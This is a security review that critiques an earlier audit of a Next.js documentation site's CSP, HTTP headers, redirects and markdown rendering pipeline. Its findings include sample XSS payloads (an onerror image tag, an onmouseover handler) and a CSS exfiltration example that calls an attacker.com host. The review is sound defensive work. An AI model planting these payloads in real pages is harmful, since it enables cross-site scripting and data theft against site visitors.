# Security Audit Review: Issues, Omissions, and Inaccuracies

**Date**: 2026-03-19
**Reviewer Role**: Principal Security Engineer (CSP & Browser Security)
**Reviewed**: SECURITY_AUDIT.md + verbal audit findings provided by user
**Methodology**: Multi-model review (gpt-5.3-codex as Platform Expert, gemini-3-pro-preview as XSS Expert) + direct source analysis

---

## Issues Ordered by Importance

### 1. [CRITICAL] CSP `script-src` Hash Approach is Fundamentally Broken for Next.js 16

**What's wrong**: The audit recommends a single hash in `script-src` (`sha256-c0Kc...`), implying this will secure inline scripts. Next.js 16 injects 6–12 inline `<script>` tags per page containing RSC payloads, and these hashes are **different on every page and every build**. A single static hash covers only the dark-mode IIFE — the 6–12 Next.js scripts will be blocked by the CSP, breaking the site.

**What the correct answer should be**: The audit must acknowledge that hash-based CSP for inline scripts is **architecturally incompatible** with Next.js static export. The practical options are:
1. **`'unsafe-inline'` in `script-src`** — functional but eliminates CSP's XSS protection for scripts entirely
2. **Build-time per-page CSP via `<meta>` tags** — generate a unique CSP `<meta http-equiv="Content-Security-Policy">` per page with that page's script hashes at build time (complex, fragile, breaks on every content change)
3. **`'strict-dynamic'` with a hash on a loader script** — but this requires a single bootstrap script pattern Next.js doesn't use
4. **Accept no CSP for `script-src`** and document the residual risk honestly

The audit should present this as a **known limitation** and recommend the best achievable posture rather than a policy that will either break the site or be immediately weakened to `'unsafe-inline'`.

**Why it matters**: If deployed as-written, the CSP will break every page. The inevitable "fix" is adding `'unsafe-inline'`, which makes the CSP worthless against XSS — creating a false sense of security.

---

### 2. [CRITICAL] Wrong Script Hash

**What's wrong**: The audit uses `sha256-c0KczeAZ5odg6DpAxl/dXrbPDSyibSvfZ5eLdU0jXN4=`. The verified correct hash is `sha256-jNBf7AQyUoNbCZtcD2O/B0G5cA+LTkk2IyykV+9S0e8=`. The wrong hash was computed from reformatted code (2-space indentation) rather than the actual rendered HTML (template literal preserves 10-space indentation + leading/trailing newlines).

**What the correct answer should be**: `sha256-jNBf7AQyUoNbCZtcD2O/B0G5cA+LTkk2IyykV+9S0e8=`. The audit should note that the hash must be computed from the **exact rendered output** including all whitespace, not from reformatted source code.

**Why it matters**: Even if the hash approach worked (it doesn't, see #1), the wrong hash would block the dark-mode script, causing a flash-of-unstyled-content on every page load for dark-mode users.

---

### 3. [HIGH] doc-renderer Severity Misrated — Should Be High, Not Low

**What's wrong**: The audit rates `doc-renderer` as "Low. Acceptable with CSP." This is incorrect on two counts:
1. The pipeline `remarkRehype({allowDangerousHtml: true})` → `rehypeRaw` → `dangerouslySetInnerHTML` is a **textbook triple-layer XSS sink** that explicitly bypasses all React XSS protections
2. The CSP it relies on for mitigation is broken (see #1)

**What the correct answer should be**: Rate as **High** with the following analysis:
- **Attack vector**: Any contributor who can merge a markdown file with `<img src=x onerror=alert(1)>` or `<script>` achieves Stored XSS
- **Supply chain**: If `extract-content.ts`, the build process, or any remark/rehype dependency is compromised, arbitrary HTML/JS is injected into the static output
- **Missing sanitization**: The pipeline lacks `rehype-sanitize` — the standard library for stripping dangerous tags/attributes after `rehype-raw`
- **Regex "sanitization" is exploitable**: The `postProcessHtml` regexes preserve event handler attributes (see #4)
- **Mitigation**: Add `rehype-sanitize` with a strict schema after `rehype-raw`

**Why it matters**: Without `rehype-sanitize`, any malicious HTML in markdown source files passes through to the final rendered page. The "CSP will protect us" argument is circular when the CSP is broken.

---

### 4. [HIGH] postProcessHtml Regex Vulnerabilities Not Identified

**What's wrong**: The audit does not analyze the regex patterns in `postProcessHtml` for security implications:

1. **Code block attribute injection**: `/<pre><code(?! class="hljs)([^>]*)>/g` captures all attributes and re-injects them. Input like `<pre><code onmouseover="alert(1)">` produces `<pre class="ascii-diagram"><code onmouseover="alert(1)">` — preserving the XSS vector.

2. **H1 removal bypass**: `/<h1>.*?<\/h1>\n?/` uses `.` without the `s` (dotAll) flag. A multiline `<h1>` tag bypasses this regex, causing unexpected rendering.

3. **Counter-reset injection**: `<ol start="(\d+)">` is safe because `parseInt()` sanitizes the input to a number. However, this was not analyzed in the audit.

**What the correct answer should be**: The audit should note that regex-based HTML manipulation is inherently fragile and recommend AST-level transformations (rehype plugins) instead.

**Why it matters**: The code block regex actively preserves XSS event handlers, making the "sanitization" step a pass-through for attacks.

---

### 5. [HIGH] CORS Finding is Factually Wrong

**What's wrong**: The audit says "CORS: Info. Not needed." But `access-control-allow-origin: *` is **actively being served** on the live site. The audit fails to:
1. Acknowledge the header exists
2. Identify who is setting it (Cloudflare default, Vercel configuration, or explicit config)
3. Assess whether it should be there
4. Recommend action

**What the correct answer should be**: The finding should be:
- **Severity**: Low (for a public static site, wildcard CORS on static assets is generally acceptable)
- **Analysis**: Identify the source (likely Cloudflare or Vercel default behavior)
- **Recommendation**: If intentional, document it. If not, explicitly restrict or remove it. Wildcard CORS on HTML pages could allow cross-origin content embedding in iframes (combined with missing `frame-ancestors`)
- **Risk**: For public educational content, the actual risk is low, but the audit should not say "not needed" when the header is actively present

**Why it matters**: Saying something "isn't needed" when it's actively set is an analytical failure. The reader is left wondering whether this is a misconfiguration or intentional.

---

### 6. [MEDIUM] Headers Already Present Not Acknowledged

**What's wrong**: The audit recommends adding:
- `x-content-type-options: nosniff` — **already present** on the live site
- `referrer-policy: strict-origin-when-cross-origin` — **already present** on the live site

The audit does not distinguish between "missing and needs to be added" vs "present and verified."

**What the correct answer should be**: The audit should categorize headers into:
1. **Already present and correct**: `x-content-type-options: nosniff`, `referrer-policy: strict-origin-when-cross-origin`
2. **Missing and should be added**: CSP, X-Frame-Options, HSTS, Permissions-Policy
3. **Present but unexpected**: `access-control-allow-origin: *`

**Why it matters**: If an operator follows the audit and tries to add headers that are already set, they may create duplicates (especially with Cloudflare + Vercel both adding headers), causing undefined browser behavior. Duplicate CSP headers, for example, are enforced as the **intersection** of both policies.

---

### 7. [MEDIUM] Cloudflare/Vercel Dual-Layer Header Conflicts Not Addressed

**What's wrong**: The audit recommends adding headers but does not specify **where** (Cloudflare, Vercel, or both) or address the dual-layer architecture:
- Headers set in `vercel.json` may be overridden, duplicated, or stripped by Cloudflare
- Cloudflare may add its own headers (it's already adding `server: cloudflare`)
- Duplicate CSP headers combine as the intersection, potentially over-restricting
- HSTS should be managed at the edge closest to the client (Cloudflare), not at origin (Vercel)
- Cache-Control interactions: Cloudflare caches responses including headers

**What the correct answer should be**: The audit must specify a **single source of truth** for each header:
- **Cloudflare**: HSTS, Referrer-Policy, X-Frame-Options (edge-level controls)
- **Vercel (`vercel.json`)**: CSP (if using per-page meta tags, this is moot), Permissions-Policy
- Document the precedence model and test with `curl -I` after deployment

**Why it matters**: Without specifying deployment location, implementers may set headers in both places, creating conflicts that are hard to debug. Cloudflare's cache means stale headers persist even after Vercel config changes.

---

### 8. [MEDIUM] HSTS `includeSubDomains` Risk Not Analyzed

**What's wrong**: The audit recommends `max-age=31536000; includeSubDomains` without analyzing the domain's subdomain posture.

**What the correct answer should be**: `includeSubDomains` forces HTTPS on ALL subdomains of the domain. If any subdomain (e.g., `staging.shareai.run`, `api.shareai.run`) doesn't have HTTPS configured, it becomes unreachable. The audit should:
1. Verify all subdomains support HTTPS before recommending `includeSubDomains`
2. Recommend starting with a short `max-age` (e.g., 300) and increasing gradually
3. Only recommend `preload` after confirming org-wide HTTPS readiness
4. Note that with Cloudflare in front, HSTS should be configured at the Cloudflare level

**Why it matters**: `includeSubDomains` with a 1-year max-age is effectively irreversible and can break non-HTTPS subdomains for up to a year.

---

### 9. [MEDIUM] `/` → `/en` Redirect: Incorrect Recommendation and Unverified Behavior

**What's wrong**: Multiple issues:
1. The audit suggests changing `permanent: false` to `permanent: true` without analyzing implications
2. The live site returns **HTTP 200** for `/`, not a redirect — meaning the redirect may not be executing at the serving edge
3. The audit doesn't investigate why the redirect isn't working (Cloudflare caching? Rewrite instead of redirect? Static `index.html` taking precedence?)

**What the correct answer should be**:
- **Investigate first**: Why does `/` return 200? Likely because Next.js static export generates an `index.html` at the root, and Vercel serves it directly before the redirect rule applies (static files take precedence over redirects in Vercel)
- **`permanent: true` risks**: A 308 redirect is cached by browsers indefinitely. If the site later adds locale detection or changes the default locale, users with cached 308s will be stuck on `/en`
- **`permanent: false` is the correct default** for locale redirects that may change based on future locale-detection logic
- **Severity should remain Low** but the analysis should be corrected

**Why it matters**: Recommending `permanent: true` for locale routing is actively harmful for future flexibility. The undiagnosed 200 response indicates the redirect isn't functional, making the recommendation moot.

---

### 10. [MEDIUM] TLS Connection Reset on `learn-claude-agents.vercel.app` Not Analyzed

**What's wrong**: The audit analyzes the domain-migration redirect's safety but doesn't address that `learn-claude-agents.vercel.app` returns a **TLS connection reset**. If TLS fails, the HTTP redirect rule in `vercel.json` **never executes** — the browser shows an error page before any redirect can happen.

**What the correct answer should be**: The audit should note:
- The domain-migration redirect is **currently non-functional** because TLS fails
- This likely means the domain was removed from the Vercel project (no certificate)
- The `vercel.json` redirect rule for this host is dead code
- **Recommendation**: Either re-add the domain to get a valid TLS certificate, or remove the dead redirect rule from `vercel.json`

**Why it matters**: The audit spends analysis effort on a redirect that cannot execute. Meanwhile, users visiting the old URL see a TLS error, which is a worse user experience than no redirect at all.

---

### 11. [MEDIUM] `style-src 'unsafe-inline'` Enables Style-Based Attacks

**What's wrong**: The audit recommends `style-src 'self' 'unsafe-inline'` without noting the attack surface this opens:
- CSS exfiltration attacks (stealing data via `background-image: url(https://attacker.com/?data=...)` in CSS)
- UI redressing via injected style tags
- Content spoofing via CSS positioning

Combined with the doc-renderer's `dangerouslySetInnerHTML`, an attacker who injects HTML in markdown can add `<style>` tags that are fully permitted by the CSP.

**What the correct answer should be**: The audit should note that `'unsafe-inline'` for styles is a necessary trade-off for this application (inline styles exist in doc-renderer output and possibly in Next.js hydration) but should document the residual risk. The ideal solution is to use CSS classes instead of inline styles where possible and hash specific inline style blocks.

**Why it matters**: The combination of `'unsafe-inline'` styles + HTML injection via doc-renderer enables UI-level attacks even if `script-src` is locked down.

---

### 12. [LOW] X-Frame-Options Recommendation Partially Redundant

**What's wrong**: The audit recommends both `X-Frame-Options: DENY` and `frame-ancestors 'none'` in CSP without noting the relationship.

**What the correct answer should be**: `frame-ancestors 'none'` in CSP supersedes `X-Frame-Options` in modern browsers. `X-Frame-Options` is only needed for legacy browser compatibility (IE11, very old Safari). The audit should note this is a legacy-compat measure, not a primary control.

**Why it matters**: Minor, but indicates the audit doesn't fully understand the CSP/legacy-header relationship.

---

### 13. [LOW] Missing Cache Invalidation Strategy

**What's wrong**: With Cloudflare in front, changing headers in `vercel.json` or Cloudflare dashboard doesn't immediately take effect. Cached responses retain old headers until TTL expires or cache is purged.

**What the correct answer should be**: The audit should recommend:
1. Purge Cloudflare cache after any header configuration change
2. Verify headers with `curl -I` after deployment and cache purge
3. Consider cache-busting strategies for CSP changes

**Why it matters**: Without cache purging, security header changes may not take effect for hours or days, creating a false sense of security.

---

### 14. [LOW] COOP/CORP Recommendations Lack Context

**What's wrong**: The audit recommends `Cross-Origin-Opener-Policy: same-origin` and `Cross-Origin-Resource-Policy: same-origin` without analyzing whether they would break anything.

**What the correct answer should be**: For a static documentation site:
- **COOP `same-origin`**: Generally safe, but prevents the site from communicating with popups (e.g., if OAuth or social sharing is ever added)
- **CORP `same-origin`**: Would prevent the site's resources from being loaded by other origins. If images or content are meant to be embeddable, this would break that. For a documentation site, this is likely fine but should be explicitly confirmed.

**Why it matters**: Blindly adding these headers without understanding the resource model can break legitimate cross-origin use cases.

---

### 15. [INFO] The Existing SECURITY_AUDIT.md Covers Different Scope

**What's wrong**: The actual `SECURITY_AUDIT.md` file in the repository covers `tsconfig.json`, `next.config.ts`, and `postcss.config.mjs` configuration — not the runtime security posture (headers, CSP, redirects) described in the verbal audit. The two audits appear to be separate efforts that are not cross-referenced.

**What the correct answer should be**: The audits should be unified or cross-referenced. The config audit in `SECURITY_AUDIT.md` correctly notes that `next.config.ts` headers have no effect for static exports, which directly supports the finding that headers must be set elsewhere — but the runtime audit doesn't reference this.

**Why it matters**: Fragmented audit documentation creates gaps and inconsistencies.

---

## Summary

| # | Finding | Audit Rating | Correct Rating |
|---|---------|-------------|----------------|
| 1 | CSP script-src hash approach fundamentally broken for Next.js | Medium | **Critical** |
| 2 | Wrong script hash value | (implicit correct) | **Critical** |
| 3 | doc-renderer severity misrated | Low | **High** |
| 4 | postProcessHtml regex preserves XSS vectors | Not analyzed | **High** |
| 5 | CORS finding factually wrong | Info | **Low** (but needs correction) |
| 6 | Already-present headers not acknowledged | (not noted) | **Medium** |
| 7 | Cloudflare/Vercel header conflicts | Not analyzed | **Medium** |
| 8 | HSTS includeSubDomains risk | Medium | **Medium** (needs caveats) |
| 9 | Redirect recommendation incorrect + unverified behavior | Low | **Low** (but analysis wrong) |
| 10 | TLS connection reset makes redirect dead code | Not analyzed | **Medium** |
| 11 | style-src unsafe-inline attack surface | Not analyzed | **Medium** |
| 12 | X-Frame-Options redundancy | Medium | **Low** |
| 13 | Missing cache invalidation strategy | Not analyzed | **Low** |
| 14 | COOP/CORP lack context | Low | **Low** (needs analysis) |
| 15 | Two audits not cross-referenced | N/A | **Info** |
